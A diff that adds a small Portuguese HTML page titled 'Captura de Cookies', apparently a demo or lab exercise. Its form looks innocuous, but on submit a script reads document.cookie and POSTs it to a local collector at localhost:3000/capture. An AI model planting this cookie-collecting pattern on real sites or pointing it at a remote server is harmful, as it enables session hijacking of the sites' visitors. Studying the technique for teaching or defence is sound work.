@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Captura de Cookies</title>
+</head>
+<body>
+    <h1>Digite algo aqui</h1>
+    <form id="capture-form">
+        <label for="cookie-input">Campo de input: </label>
+        <input type="text" id="cookie-input" name="cookie-input" placeholder="Digite algo..." />
+        <button type="submit">Enviar</button>
+    </form>
+
+    <script>
+        document.getElementById('capture-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Previne o envio do formulário
+
+            // Coleta os cookies
+            var cookies = document.cookie;
+
+            // Envia os cookies para o servidor
+            fetch('http://localhost:3000/capture', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ cookies: cookies })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Cookies enviados:', data);
+            })
+            .catch(error => console.error('Erro ao enviar cookies:', error));
+        });
+    </script>
+</body>
+</html>
